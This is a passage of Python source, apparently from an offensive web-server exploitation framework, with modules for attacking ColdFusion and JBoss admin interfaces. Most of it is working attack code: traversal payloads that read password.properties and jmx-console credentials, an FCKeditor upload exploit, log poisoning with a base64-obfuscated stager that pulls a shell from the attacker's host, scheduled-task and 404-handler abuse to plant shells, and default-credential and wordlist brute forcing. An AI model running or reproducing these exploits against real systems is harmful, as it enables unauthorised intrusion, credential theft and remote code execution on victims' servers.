        base = "http://{0}:{1}".format(fingerengine.options.ip, fingerprint.port)
        uri = "/CFIDE/adminapi/customtags/l10n.cfm?attributes.id=it"\
              "&attributes.file=../../administrator/mail/download.cfm"\
              "&filename={0}&attributes.locale=it&attributes.var=it"\
              "&attributes.jscript=false&attributes.type=text/html"\
              "&attributes.charset=UTF-8&thisTag.executionmode=end"\
              "&thisTag.generatedContent=htp"

        if fingerengine.options.remote_os == 'linux':
            paths.append('opt/coldfusion/cfusion/lib/password.properties')
            if fingerprint.version == "9.0":
                paths.append('opt/coldfusion9/cfusion/lib/password.properties')
            else:
                paths.append('opt/coldfusion10/cfusion/lib/password.properties')

        else:
            paths.append('ColdFusion\lib\password.properties')
            if fingerprint.version == "9.0":
                paths.append('ColdFusion9\lib\password.properties')
                paths.append('ColdFusion9\cfusion\lib\password.properties')
            else:
                paths.append('ColdFusion10\lib\password.properties')
                paths.append('ColdFusion10\cfusion\lib\password.properties')

        for path in paths:

            luri = uri.format('{0}' + path)
            content = self.checkURL(fingerengine, base + luri, 'password=')
            if content:

                pw_hash = re.findall("password=(.*?)\r\n", content)
                if len(pw_hash) > 0:
                    utility.Msg("Administrative hash: %s" % pw_hash[1], LOG.SUCCESS)
                    break

########NEW FILE########
__FILENAME__ = info_dump
from src.platform.coldfusion.authenticate import checkAuth
from src.platform.coldfusion.interfaces import CINTERFACES
from auxiliary import Auxiliary
from log import LOG
from re import findall
import utility


class Auxiliary:

    def __init__(self):
        self.name = 'Dump host information'
        self.versions = ['7.0', '8.0', '9.0', '10.0', '11.0']
        self.show = True
        self.flag = 'cf-info'

    def check(self, fingerprint):
        if fingerprint.title == CINTERFACES.CFM and \
           fingerprint.version in self.versions:
            return True
        return False

    def run(self, fingerengine, fingerprint):
        """ Obtains remote Coldfusion information from the reports index page.
        This pulls the first 26 entries from this report, as there's lots of
        extraneous stuff.  Perhaps if requested I'll prompt to extend to the
        remainder of the settings.
        """

        utility.Msg("Attempting to retrieve Coldfusion info...")

        base = "http://{0}:{1}".format(fingerengine.options.ip, fingerprint.port)
        uri = "/CFIDE/administrator/reports/index.cfm"

        if fingerprint.version in ["7.0"]:
            uri = '/CFIDE/administrator/settings/version.cfm'

        try:
            response = utility.requests_get(base + uri)
        except Exception, e:
            utility.Msg("Failed to fetch info: %s" % e, LOG.ERROR)
            return
            
        if response.status_code == 200 and "ColdFusion Administrator Login" \
                                 in response.content:

            utility.Msg("Host %s:%s requires auth, checking..." % 
                            (fingerengine.options.ip, fingerprint.port), LOG.DEBUG)
            cookies = checkAuth(fingerengine.options.ip, fingerprint.port,
                                fingerprint.title, fingerprint.version)
            
            if cookies:
                response = utility.requests_get(base + uri, cookies=cookies[0])
            else:
                utility.Msg("Could not get auth for %s:%s" %
                               (fingerengine.options.ip, fingerprint.port), LOG.ERROR)
                return

        if response.status_code == 200:
           
            regex = self.versionRegex(fingerprint.version)
            types = findall(regex[0], response.content.translate(None, "\n\t\r"))
            data = findall(regex[1], response.content.translate(None, "\n\t\r"))
 
            # pad
            if fingerprint.version in ["8.0", "9.0", "10.0", '11.0']:
                types.insert(0, "Version")

            for (row, data) in zip(types, data)[:26]:
               utility.Msg('  %s: %s' % (row, data[:-7]))

    def versionRegex(self, version):
        """
        """

        if version in ["7.0"]:
            return ["<td nowrap class=\"cell3BlueSides\">(.*?)</td>",
                    "<td nowrap class=\"cellRightAndBottomBlueSide\">(.*?)</td>"]
        else:
            return ["<td scope=row nowrap class=\"cell3BlueSides\">(.*?)</td>",
                    "<td scope=row class=\"cellRightAndBottomBlueSide\">(.*?)</td>"]

########NEW FILE########
__FILENAME__ = fck_editor
from src.platform.coldfusion.interfaces import CINTERFACES
from src.module.deploy_utils import parse_war_path
from os.path import abspath
from log import LOG
import utility


title = CINTERFACES.CFM
versions = ['8.0']
def deploy(fingerengine, fingerprint):
    """ Exploits the exposed FCKeditor in CF 8.x
    """

    cfm_path = abspath(fingerengine.options.deploy)
    cfm_name = parse_war_path(cfm_path, True)
    dip = fingerengine.options.ip

    utility.Msg("Checking if FCKEditor is exposed...")
    url = "http://{0}:{1}".format(dip, fingerprint.port)
    uri = "/CFIDE/scripts/ajax/FCKeditor/editor/dialog/fck_about.html"

    response = utility.requests_get(url + uri)
    if response.status_code is 200 and "FCKeditor" in response.content:
        utility.Msg("FCKeditor exposed, attempting to write payload...")
    else:
        utility.Msg("FCKeditor doesn't seem to be exposed (HTTP %d)" % response.status_code)
        return

    try:
        payload = {"NewFile" : ("asdf.txt", open(cfm_path, "r").read())}
    except Exception, e:
        utility.Msg("Error reading file: %s" % e, LOG.ERROR)
        return
    
    uri = "/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm"        
    uri += "?Command=FileUploads&Type=File&CurrentFolder=/{0}%00".format(cfm_name)

    response = utility.requests_post(url + uri, files=payload)
    if response.status_code == 200 and "OnUploadCompleted" in response.content: 
        utility.Msg("Deployed.  Access /userfiles/file/{0} for payload"\
                            .format(cfm_name), LOG.SUCCESS)
    else:
        utility.Msg("Could not write payload (HTTP %d)" % (response.status_code))

########NEW FILE########
__FILENAME__ = lfi_stager
from src.platform.coldfusion.interfaces import CINTERFACES
from src.module.deploy_utils import parse_war_path, _serve, waitServe, killServe
from threading import Thread
from base64 import b64encode
from os.path import abspath
from urllib import quote_plus
from requests import get
from log import LOG
import state
import utility

title = CINTERFACES.CFM
versions = ['6.0', '7.0', '8.0'] 
def deploy(fingerengine, fingerprint):
    """ Exploits log poisoning to inject CFML stager code that pulls
    down our payload and stashes it in web root
    """            

    cfm_path = abspath(fingerengine.options.deploy)
    cfm_file = parse_war_path(cfm_path, True)
    dip = fingerengine.options.ip

    base = 'http://{0}:{1}/'.format(dip, fingerprint.port)
    stager = "<cfhttp method='get' url='#ToString(ToBinary('{0}'))#'"\
              " path='#ExpandPath(ToString(ToBinary('Li4vLi4v')))#'"\
              " file='{1}'>"

    # ensure we're deploying a valid filetype
    extension = cfm_file.rsplit('.', 1)[1]
    if extension.lower() not in ['jsp', 'cfml']:
        utility.Msg("This deployer requires a JSP/CFML payload", LOG.ERROR)
        return

    # start up our local server to catch the request
    server_thread = Thread(target=_serve, args=(cfm_path,))
    server_thread.start()

    # inject stager
    utility.Msg("Injecting stager...")
    b64addr = b64encode('http://{0}:{1}/{2}'.format(utility.local_address(), 
                                             state.external_port,cfm_file))
    stager = quote_plus(stager.format(b64addr, cfm_file))
 
    stager += ".cfml" # trigger the error for log injection
    _ = utility.requests_get(base + stager)

    # stager injected, now load the log file via LFI
    if fingerprint.version in ["9.0", "10.0"]:
        LinvokeLFI(base, fingerengine, fingerprint)
    else:
        invokeLFI(base, fingerengine, fingerprint) 

    if waitServe(server_thread):
        utility.Msg("{0} deployed at /{0}".format(cfm_file), LOG.SUCCESS)
    else:
        utility.Msg("Failed to deploy file.", LOG.ERROR)
        killServe()

def invokeLFI(base, fingerengine, fingerprint):            
    """ Invoke the LFI based on the version
    """

    ver_dir = { "6.0" : "CFusionMX\logs\\application.log",
                "7.0" : "CFusionMX7\logs\\application.log",
                "8.0" : "ColdFusion8\logs\\application.log",
                "JRun" : "JRun4\servers\cfusion\cfusion-ear\cfusion-war"\
                         "\WEB-INF\cfusion\logs\\application.log"
              }

    uri = "/CFIDE/administrator/enter.cfm?locale={0}" + \
                            ver_dir[fingerprint.version] + "%00en"

    if checkURL(fingerengine, base + uri, "Severity"):
        return True

    else:
        # try JRun
        uri = "/CFIDE/administrator/enter.cfm?locale={0}" + \
                            ver_dir['JRun'] + '%00en'
        if checkURL(fingerengine, base + uri, "Severity"):
            return True


def LinvokeLFI(base, fingerengine, fingerprint):
    """ Currently unsupported; need to turn LFD into LFI
    """

    paths = []
    uri = "/CFIDE/adminapi/customtags/l10n.cfm?attributes.id=it"\
          "&attributes.file=../../administrator/mail/download.cfm"\
          "&filename={0}&attributes.locale=it&attributes.var=it"\
          "&attributes.jscript=false&attributes.type=text/html"\
          "&attributes.charset=UTF-8&thisTag.executionmode=end"\
          "&thisTag.generatedContent=htp"

    if fingerengine.options.remote_os == 'linux':
        paths.append('opt/coldfusion/cfusion/logs/application.log')
        if fingerprint.version == "9.0":
            paths.append('opt/coldfusion9/cfusion/logs/application.log')
        else:
            paths.append('opt/coldfusion10/cfusion/logs/application.log')

    else:
        paths.append('ColdFusion\logs\\application.log')
        if fingerprint.version == "9.0":
            paths.append('ColdFusion9\logs\\application.log')
            paths.append('ColdFusion9\cfusion\logs\\application.log')
        else:
            paths.append('ColdFusion10\logs\\application.log')
            paths.append('ColdFusion10\cfusion\logs\\application.log')
            
    for path in paths:

        luri = uri.format("{0}" + path)
        if checkURL(fingerengine, base + luri, 'Severity'):
            print luri
            return True
       

def checkURL(fingerengine, url, keyword):
    """ Inject traversal markers into the URL.  Applying
    a floor of 7 and ceiling of 12, as this seems to be the most likely range.
    """

    for dots in range(7, 12):
        
        if fingerengine.options.remote_os == 'linux':
            t_url = url.format("../" * dots)
        else:
            t_url = url.format("..\\" * dots)

        response = utility.requests_get(t_url)
        if response.status_code == 200 and keyword in response.content:
            return True

########NEW FILE########
__FILENAME__ = schedule_job
from src.platform.coldfusion.interfaces import CINTERFACES
from src.platform.coldfusion.authenticate import checkAuth
from src.module.deploy_utils import _serve, waitServe, parse_war_path,killServe
from os.path import abspath
from log import LOG
from threading import Thread
from re import findall
from time import sleep
from os import system
import state
import utility


title = CINTERFACES.CFM
versions = ['7.0', '8.0', '9.0', '10.0', '11.0']
def deploy(fingerengine, fingerprint):
    """ This is currently a little messy since all major versions
    have slight differences between them.  If 6.x/7.x are significantly
    different, I may split these out.

    This module invokes the Scheduled Tasks feature of CF to deploy
    a JSP or CFML shell to the remote CF server.  This requires auth.
    """

    cfm_path = abspath(fingerengine.options.deploy)
    cfm_file = parse_war_path(cfm_path, True)
    dip = fingerengine.options.ip

    if fingerprint.version in ["10.0", '11.0']:
        # we need the file to end with .log
        tmp = cfm_file.split('.')[0]
        system("cp %s %s/%s.log" % (cfm_path, state.serve_dir, tmp))
        cfm_file = "%s.log" % tmp 
        cfm_path = "%s/%s" % (state.serve_dir, cfm_file)

    utility.Msg("Preparing to deploy {0}...".format(cfm_file))
    utility.Msg("Fetching web root...", LOG.DEBUG)

    # fetch web root; this is where we stash the file
    root = fetch_webroot(dip, fingerprint)
    if not root:
        utility.Msg("Unable to fetch web root.", LOG.ERROR)
        return

    # create the scheduled task
    utility.Msg("Web root found at %s" % root, LOG.DEBUG)
    utility.Msg("Creating scheduled task...")

    if not create_task(dip, fingerprint, cfm_file, root):
        return 

    # invoke the task
    utility.Msg("Task %s created, invoking task..." % cfm_file)
    run_task(dip, fingerprint, cfm_path)

    # remove the task
    utility.Msg("Cleaning up...")
    delete_task(dip, fingerprint, cfm_file)

    if fingerprint.version in ["10.0", '11.0']:
        # set the template 404 handler
        set_template(dip, fingerprint, root, cfm_file)


def create_task(ip, fingerprint, cfm_file, root):
    """ Create the task
    """

    url = "http://{0}:{1}/CFIDE/administrator/scheduler/scheduleedit.cfm".\
                                                    format(ip, fingerprint.port)

    (cookie, csrf) = fetch_csrf(ip, fingerprint, url)
    data = {
            "TaskName" : cfm_file,
            "Start_Date" : "Jan 27, 2014", # shouldnt matter since we force run
            "ScheduleType" : "Once",
            "StartTimeOnce" : "9:56 PM", # see above
            "Operation" : "HTTPRequest",
            "ScheduledURL" : "http://{0}:{1}/{2}".format(
                    state.external_port,utility.local_address(), cfm_file),
            "publish" : "1",
            "publish_file" : root + "\\" + cfm_file, # slash on OS?
            "adminsubmit" : "Submit"
           }

    # version-specific settings
    if fingerprint.version in ["9.0", "10.0", '11.0']:
        data['csrftoken'] = csrf

    if fingerprint.version in ["10.0", '11.0']:
        data['publish_overwrite'] = 'on'
    
    if fingerprint.version in ["7.0", "8.0"]:
        data['taskNameOrig'] = ""

    response = utility.requests_get(url, cookies=cookie)
    if response.status_code is 200:

        # create task
        response = utility.requests_post(url, data=data, cookies=cookie,
                        headers={'Content-Type':'application/x-www-form-urlencoded'})
        if response.status_code is 200:
            return True
        else:
            utility.Msg("Failed to deploy (HTTP %d)" % response.status_code, LOG.ERROR);


def delete_task(ip, fingerprint, cfm_file):
    """ Once we run the task and pop our shell, we need to remove the task
    """

    url = "http://{0}:{1}/CFIDE/administrator/scheduler/scheduletasks.cfm".\
                                                format(ip, fingerprint.port)

    (cookie, csrf) = fetch_csrf(ip, fingerprint, url)
    if fingerprint.version in ["7.0", "8.0"]:
        uri = "?action=delete&task={0}".format(cfm_file)
    elif fingerprint.version in ["9.0"]:
        uri = "?action=delete&task={0}&csrftoken={1}".format(cfm_file, csrf)
    elif fingerprint.version in ["10.0", '11.0']:
        uri = "?action=delete&task={0}&group=default&mode=server&csrftoken={1}"\
                                                        .format(cfm_file, csrf)

    response = utility.requests_get(url + uri, cookies=cookie)
    if not response.status_code is 200:
        utility.Msg("Failed to remove task.  May require manual removal.", LOG.ERROR)


def run_task(ip, fingerprint, cfm_path):
    """ Invoke the task and wait for the remote server to fetch
    our file
    """

    cfm_name = parse_war_path(cfm_path, True)
        
    # kick up the HTTP server
    server_thread = Thread(target=_serve, args=(cfm_path,))
    server_thread.start()
    sleep(2)

    url = "http://{0}:{1}/CFIDE/administrator/scheduler/scheduletasks.cfm"\
                                                  .format(ip, fingerprint.port)

    (cookie, csrf) = fetch_csrf(ip, fingerprint, url)
    
    if fingerprint.version in ["7.0", "8.0"]:
        uri = "?runtask={0}&timeout=0".format(cfm_name)
    elif fingerprint.version in ["9.0"]:
        uri = "?runtask={0}&timeout=0&csrftoken={1}".format(cfm_name, csrf)
    elif fingerprint.version in ["10.0", '11.0']:
        uri = "?runtask={0}&group=default&mode=server&csrftoken={1}".format(cfm_name, csrf)

    response = utility.requests_get(url + uri, cookies=cookie)
    if waitServe(server_thread):
        utility.Msg("{0} deployed to /CFIDE/{0}".format(cfm_name), LOG.SUCCESS)

    killServe()


def fetch_csrf(ip, fingerprint, url):
    """ Most of these requests use a CSRF; we can grab this so long as
    we send the request using the same session token.

    Returns a tuple of (cookie, csrftoken)
    """

    if fingerprint.version not in ['9.0', '10.0', '11.0']:
        # versions <= 8.x do not use a CSRF token
        return (checkAuth(ip, fingerprint.port, title, fingerprint.version)[0], None)

    # lets try and fetch CSRF
    cookies = checkAuth(ip, fingerprint.port, title, fingerprint.version)
    if cookies:
        response = utility.requests_get(url, cookies=cookies[0])
    else:
        utility.Msg("Could not get auth for %s:%s" % (ip, fingerprint.port), LOG.ERROR)
        return False

    if response.status_code is 200:

        token = findall("name=\"csrftoken\" value=\"(.*?)\">", response.content)
        if len(token) > 0:
            return (cookies[0], token[0])
        else:
            utility.Msg("CSRF appears to be disabled.", LOG.DEBUG)
            return (cookies[0], None)


def fetch_webroot(ip, fingerprint):
    """ Pick out the web root from the settings summary page 
    """

    url = "http://{0}:{1}/CFIDE/administrator/reports/index.cfm"\
                                        .format(ip, fingerprint.port)

    cookies = checkAuth(ip, fingerprint.port, title, fingerprint.version)
    if cookies:
        req = utility.requests_get(url, cookies=cookies[0])
    else:
        utility.Msg("Could not get auth for %s:%s" % (ip, fingerprint.port), LOG.ERROR)
        return False

    if req.status_code is 200:
        
        root_regex = "CFIDE &nbsp;</td><td scope=row class=\"cellRightAndBottomBlueSide\">(.*?)</td>"
        if fingerprint.version in ["7.0"]:
            root_regex = root_regex.replace("scope=row ", "")

        data = findall(root_regex, req.content.translate(None, "\n\t\r"))
        if len(data) > 0:
            return data[0].replace("&#x5c;", "\\").replace("&#x3a;", ":")[:-7]
        else:
            return False


def set_template(ip, fingerprint, root, cfm_file):
    """ ColdFusion 10.x+ doesn't allow us to simply schedule a task to obtain
    a CFM shell; instead, we deploy the payload with a .log extension, then set
    the file as the 404 handler.  We can then trigger a 404 to invoke our payload.
    """

    url = "http://{0}:{1}/CFIDE/administrator/settings/server_settings.cfm"\
                                .format(ip, fingerprint.port)

    template_handler = '/' + root.rsplit('\\', 1)[1] + '/' + cfm_file
    utility.Msg("Setting template handler to %s" % template_handler, LOG.DEBUG)

    (cookie, csrftoken) = fetch_csrf(ip, fingerprint, url)
    data = {
            "csrftoken" : csrftoken,
            "LimitTime" : "true",
            "MaxSeconds": 60,
            "enablePerAppSettings" : 1,
            "uuidtoken" : 1,
            "enablehttpst" : 1,
            "WsEnable" : 1,
            "secureJSONPrefix" : "//",
            "outputBufferMax" : 1024,
            "enableInMemoryFileSystem" : 1,
            "inMemoryFileSystemLimit" : 100,
            "inMemoryFileSystemApplicationLimit" : 20,
            "WatchInterval" : 120,
            "globalScriptProtect" : "FORM,URL,COOKIE,CGI",
            "allowExtraAttributesInAttrColl" : 1,
            "cFaaSGeneratedFilesExpiryTime" : 30,
            "ORMSearchIndexDirectory" : "",
            "CFFORMScriptSrc" : "/CFIDE/scripts/",
            "GoogleMapKey" : "",
            "serverCFC" : "Server",
            "applicationCFCLookup" : 1,
            "MissingTemplateHandler" : template_handler,
            "SiteWideErrorHandler" : "",
            "postParametersLimit" : 100,
            "postSizeLimit" : 20,
            "throttleThreshold" : 4,
            "throttleMemory" : 200,
            "adminsubmit" : "Submit Changes"
           }

    response = utility.requests_post(url, data=data, cookies=cookie)

    if response.status_code == 200:
        if "missing template handler does not exist" in response.content:
            utility.Msg("Failed to set handler; invoked file not found.", LOG.ERROR)
        else:
            utility.Msg("Deployed.  Access /CFIDE/ad123.cfm for your payload.", LOG.SUCCESS)
        return True

########NEW FILE########
__FILENAME__ = CF10
from src.platform.coldfusion.interfaces import CINTERFACES
from cprint import FingerPrint

class FPrint(FingerPrint):

    def __init__(self):
        self.platform = "coldfusion"
        self.version = "10.0"
        self.title = CINTERFACES.CFM
        self.uri = "/CFIDE/administrator/images/loginbackground.jpg"
        self.port = 80
        self.hash = "a4c81b7a6289b2fc9b36848fa0cae83c"

########NEW FILE########
__FILENAME__ = CF11
from src.platform.coldfusion.interfaces import CINTERFACES
from cprint import FingerPrint

class FPrint(FingerPrint):

    def __init__(self):
        self.platform = "coldfusion"
        self.version = "11.0"
        self.title = CINTERFACES.CFM
        self.uri = "/CFIDE/administrator/images/loginbackground.jpg"
        self.port = 80
        self.hash = "9d11ede6e4ca9f1bf57b856c0df82ee6"

########NEW FILE########
__FILENAME__ = CF61
from src.platform.coldfusion.interfaces import AdminInterface


class FPrint(AdminInterface):

    def __init__(self):
        super(FPrint, self).__init__()
        self.version = "6.1"

########NEW FILE########
__FILENAME__ = CF7
from src.platform.coldfusion.interfaces import CINTERFACES
from cprint import FingerPrint

class FPrint(FingerPrint):

    def __init__(self):
        self.platform = "coldfusion"
        self.version = "7.0"
        self.title = CINTERFACES.CFM
        self.uri = "/CFIDE/administrator/images/AdminColdFusionLogo.gif"
        self.port = 80
        self.hash = "620b2523e4680bf031ee4b1538733349"

########NEW FILE########
__FILENAME__ = CF8
from src.platform.coldfusion.interfaces import CINTERFACES
from cprint import FingerPrint

class FPrint(FingerPrint):

    def __init__(self):
        self.platform = "coldfusion"
        self.version = "8.0"
        self.title = CINTERFACES.CFM 
        self.uri = "/CFIDE/administrator/images/loginbackground.jpg"
        self.port = 80
        self.hash = "779efc149954677095446c167344dbfc"

########NEW FILE########
__FILENAME__ = CF9
from src.platform.coldfusion.interfaces import CINTERFACES
from cprint import FingerPrint

class FPrint(FingerPrint):

    def __init__(self):
        self.platform = "coldfusion"
        self.version = "9.0"
        self.title = CINTERFACES.CFM
        self.uri = "/CFIDE/administrator/images/loginbackground.jpg"
        self.port = 80
        self.hash = "596b3fc4f1a0b818979db1cf94a82220"

########NEW FILE########
__FILENAME__ = interfaces
from cprint import FingerPrint
from requests import exceptions
from log import LOG
import utility


class CINTERFACES:
    CFM = "ColdFusion Manager"


class AdminInterface(FingerPrint):
    """
    """

    def __init__(self):
        self.platform = "coldfusion"
        self.version = None
        self.title = CINTERFACES.CFM
        self.uri = "/CFIDE/administrator"
        self.port = 80
        self.hash = None

    def check(self, ip, port = None):
        """
        """

        try:
            rport = self.port if port is None else port
            url = "http://{0}:{1}{2}".format(ip, rport, self.uri)

            response = utility.requests_get(url)

            if "Version: {0}".format(self.version.replace('.',',')) in response.content:
                return True

        except exceptions.Timeout:
            utility.Msg("{0} timeout to {1}:{2}".format(self.platform, ip,
                                                        rport), LOG.DEBUG)
        except exceptions.ConnectionError:
            utility.Msg("{0} connection error to {1}:{2}".format(self.platform,
                                                 ip, rport), LOG.DEBUG)

        return False

########NEW FILE########
__FILENAME__ = authenticate
from src.platform.jboss.interfaces import JINTERFACES
from requests.auth import HTTPBasicAuth, HTTPDigestAuth
from requests.utils import dict_from_cookiejar
from collections import OrderedDict
from sys import stdout
from log import LOG
import state
import utility

""" Return a tuple of cookies and an auth object.  Versions 7.x of JBoss
return only a username/password, because it is ridiculous and breaks compatability
"""

#
# list of tuples consisting of (username, password) to try when
# a 401 is discovered.
#
default_credentials = [("admin", "admin")]

def _auth(usr, pswd, url, version):
    """
    """

    authobj = HTTPBasicAuth
    if version in ['7.0', '7.1', '8.0']:
        authobj = HTTPDigestAuth

    res = utility.requests_get(url, auth=authobj(usr, pswd))

    if res.status_code is 200:
        utility.Msg("Successfully authenticated with %s:%s" % (usr, pswd), LOG.DEBUG)
        return (dict_from_cookiejar(res.cookies), authobj(usr, pswd))


def checkAuth(ip, port, title, version):
    """
    """

    if version in ["5.1", "6.0", "6.1"] and title is JINTERFACES.WM:
        for (usr, pswd) in default_credentials:
            url = "http://%s:%s/admin-console/login.seam" % (ip, port)
            data = OrderedDict([
                    ("login_form", "login_form"),
                    ("login_form:name", usr),
                    ("login_form:password", pswd),
                    ("login_form:submit", "Login"),
                    ("javax.faces.ViewState", utility.fetch_viewState(url)),
                   ])

            response = utility.requests_post(url, data=data)
            if response.status_code == 200:
                utility.Msg("Successfully authenticated with %s:%s" % (usr, pswd), LOG.DEBUG)
                if version in ["5.1"]:
                    return (dict_from_cookiejar(response.history[0].cookies), None)
                return (dict_from_cookiejar(response.cookies), None)

    else:
        if title is JINTERFACES.JMX:
            url = "http://%s:%s/jmx-console/" % (ip, port)
        elif title is JINTERFACES.MM:
            url = "http://%s:%s/management" % (ip, port)
        elif title is JINTERFACES.WC:
            url = "http://%s:%s/web-console" % (ip, port)
        else:
            utility.Msg("Unsupported auth interface: %s" % title, LOG.DEBUG)
            return

        # check with given auth
        if state.usr_auth:
            (usr, pswd) = state.usr_auth.split(':')
            return _auth(usr, pswd, url, version)

        # else try default credentials
        for (usr, pswd) in default_credentials:
            cook = _auth(usr, pswd, url, version)
            if cook:
                return cook

        # if we're still here, check if they supplied a wordlist
        if state.bf_wordlist and not state.hasbf:

            state.hasbf = True
            wordlist = []
            with open(state.bf_wordlist, 'r') as f:
                # ensure everything is ascii or requests will explode
                wordlist = [x.decode("ascii", "ignore").rstrip() for x in f.readlines()]

            utility.Msg("Brute forcing %s account with %d passwords..." %
                                        (state.bf_user, len(wordlist)), LOG.DEBUG)

            try:
                for (idx, word) in enumerate(wordlist):
                    stdout.flush()
                    stdout.write("\r\033[32m [%s] Brute forcing password for %s [%d/%d]\033[0m" \
                                        % (utility.timestamp(), state.bf_user,
                                           idx+1, len(wordlist)))

                    cook = _auth(state.bf_user, word, url, version)
                    if cook:
                        print ''  # newline

                        # lets insert these credentials to the default list so we
                        # don't need to bruteforce it each time
                        if not (state.bf_user, word) in default_credentials:
                            default_credentials.insert(0, (state.bf_user, word))

                        utility.Msg("Successful login %s:%s" % 
                                        (state.bf_user, word), LOG.SUCCESS)
                        return cook

                print ''

            except KeyboardInterrupt:
                pass

########NEW FILE########
__FILENAME__ = fetch_creds
from auxiliary import Auxiliary
from log import LOG
import socket
import utility

class Auxiliary:

    def __init__(self):
        self.name = 'JBoss Path Traversal (CVE-2005-2006)'
        self.versions = ['3.0', '3.2', '4.0']
        self.show = False
        self.flag = 'jb-fetch'

    def check(self, fingerprint):
        """
        """

        if fingerprint.version in self.versions:
            return True
        return False

    def _getPath(self, version):
        """ Return the traversal path based on the version.  I haven't figured out
        how to traverse just yet in 3.0/4.0.2, but it should be possible.
        """

        if version in ["3.0", "4.0"]:
            utility.Msg("Version %s is not vulnerable to credential retrieval"
                        ", but is vulnerable to path disclosure" % version, 
                        LOG.UPDATE)
            return ".\\\..\\\client\\\\auth.conf"
        elif version in ["3.2"]:
            return "jmx-console-users.properties"

    def run(self, fingerengine, fingerprint):
        """ Fetch the credentials, or at least attempt to.  We use raw
        sockets here because Requests doesn't allow us to submit malformed
        URLs.
        """

        utility.Msg("Attempting to retrieve jmx-console credentials...")

        request = "GET %{0} HTTP/1.0\r\n".format(self._getPath(fingerprint.version))

        try:
            sock = socket.socket()
            sock.connect((fingerengine.options.ip, 8083))
            sock.send(request)

            # weirdness in how jboss responds with data 
            tick = 0
            while tick < 5:

                data = sock.recv(2048)
                if '200 OK' in data:
                    
                    data = data.split('\n')
                    for entry in data[5:]:
                        if len(entry) <= 1:
                            continue

                        utility.Msg('  %s' % entry, LOG.SUCCESS)
                    break

                elif '400' in data:
                    utility.Msg("  %s" % data.split(' ')[2], LOG.SUCCESS)
                    break

                else:
                    tick += 1

        except Exception, e:
            utility.Msg("Failed: %s" % e, LOG.ERROR)

########NEW FILE########
__FILENAME__ = info_dump
from src.platform.jboss.authenticate import checkAuth
from src.platform.jboss.interfaces import JINTERFACES
from auxiliary import Auxiliary
from log import LOG
from re import findall
import utility


class Auxiliary:

    def __init__(self):
        self.name = "Dump host information"
        self.versions = ['Any']
        self.show = True
        self.flag = 'jb-info'

    def check(self, fingerprint):
        if fingerprint.title in [JINTERFACES.JMX, JINTERFACES.MM]:
            return True

        return False

    def run(self, fingerengine, fingerprint):
        """ This runs the jboss.system:type=ServerInfo MBean to gather information
        about the host OS.  JBoss 7.x uses the HTTP API instead to query for this
        info, which also happens to give us quite a bit more.
        """

        utility.Msg("Attempting to retrieve JBoss info...")

        if fingerprint.version in ["7.0", "7.1", "8.0"]:
            # JBoss 7.x uses an HTTP API instead of jmx-console/
            return self.run7(fingerengine, fingerprint)

        base = "http://{0}:{1}".format(fingerengine.options.ip, fingerprint.port)
        uri = "/jmx-console/HtmlAdaptor?action=inspectMBean&name=jboss.system"\
                  ":type=ServerInfo"
        url = base + uri

        response = utility.requests_get(url)
        if response.status_code == 401:

            utility.Msg("Host %s:%s requires auth, checking..." %
                          (fingerengine.options.ip, fingerprint.port), LOG.DEBUG)
            cookies = checkAuth(fingerengine.options.ip, fingerprint.port,
                                fingerprint.title, fingerprint.version)

            if cookies:
                response = utility.requests_get(url, cookies=cookies[0],
                                                auth=cookies[1])
            else:
                utility.Msg("Could not get auth for %s:%s" %
                            (fingerengine.options.ip, fingerprint.port), LOG.ERROR)
                return

        if response.status_code == 200:

            if fingerprint.version in ["3.0", "3.2"]:
                names = findall("<span class='aname'>(.*?)</span>", response.content.replace('\n',''))[1:]
                data = findall("<pre>(.*?)</pre>", response.content.replace('\n',''))
            
                for (key, value) in zip(names, data):
                    utility.Msg("\t{0}: {1}".format(key, value))

            elif fingerprint.version in ["4.0", "4.2"]:
                data = findall("<td>(.*?)</td>", response.content.replace('\n',''))

                for x in range(9, len(data)-9, 5):
                    utility.Msg("\t{0}: {1}".format(data[x+1].lstrip().rstrip(),
                                      data[x+4].lstrip().rstrip()))

            elif fingerprint.version in ["5.0", "5.1", "6.0", "6.1"]:
                names = findall("<td class='param'>(.*?)</td>", response.content.replace('\n',''))
                data = findall("<pre>(.*?)</pre>", response.content.replace('\n',''))

                for (key, value) in zip(names, data):
                    utility.Msg("\t{0}: {1}".format(key,value.rstrip('').lstrip()))

            else:
                utility.Msg("Version %s is not supported by this module." % 
                                                    fingerprint.version, LOG.ERROR)


    def run7(self, fingerengine, fingerprint):
        """ Runs our OS query using the HTTP API

        NOTE: This does not work against 7.0.0 or 7.0.1 because the platform-mbean 
        was not exposed until 7.0.2 and up. See AS7-340
        """

        url = "http://{0}:{1}/management".format(fingerengine.options.ip,
                                                 fingerprint.port)
        info = '{"operation":"read-resource", "include-runtime":"true", "address":'\
               '[{"core-service":"platform-mbean"},{"type":"runtime"}], "json.pretty":1}'
        headers = {"Content-Type":"application/json"}

        response = utility.requests_post(url, data=info, headers=headers)
        if response.status_code == 401:
                
            utility.Msg("Host %s:%s requires auth, checking..." % 
                            (fingerengine.options.ip, fingerprint.port), LOG.DEBUG)
            cookies = checkAuth(fingerengine.options.ip, fingerprint.port,
                                fingerprint.title, fingerprint.version)
            if cookies:
                response = utility.requests_post(url, data=info, cookies=cookies[0],
                                                auth=cookies[1], headers=headers)
            else:
                utility.Msg("Could not get auth for %s:%s" %
                                (fingerengine.options.ip, fingerprint.port), LOG.ERROR)
                return

        if response.status_code == 200:

            result = response.json()['result']
            for key in result.keys():

                if 'system-properties' in key:
                    for skey in result[key].keys():
                        utility.Msg('\t%s: %s' % (skey, result[key][skey]))
                else:
                    utility.Msg('\t%s: %s' % (key, result[key]))

        elif response.status_code == 500:
            utility.Msg("Failed to retrieve system properties, checking if "
                        "this is 7.0.0/7.0.1...")

            info = '{"operation":"read-attribute", "name":"server-state"}'

            response = utility.requests_post(url, data=info, headers=headers)
            if response.status_code == 200:
                utility.Msg("Older version found.  This version is unsupported.")
            else:
                utility.Msg("Failed to retrieve info (HTTP %d)", response.status_code,
                                                                LOG.DEBUG)  
        else:
            utility.Msg("Failed to retrieve info (HTTP %d)" % response.status_code,
                                                              LOG.DEBUG)   

########NEW FILE########
__FILENAME__ = list_wars
from src.platform.jboss.authenticate import checkAuth
from src.platform.jboss.interfaces import JINTERFACES
from auxiliary import Auxiliary
from re import findall
from log import LOG
import utility


class Auxiliary:
    """Obtain deployed WARs through jmx-console
    """

    def __init__(self):
        self.name = "List deployed WARs"
        self.versions = ['Any']
        self.show = True
        self.flag = "jb-list"

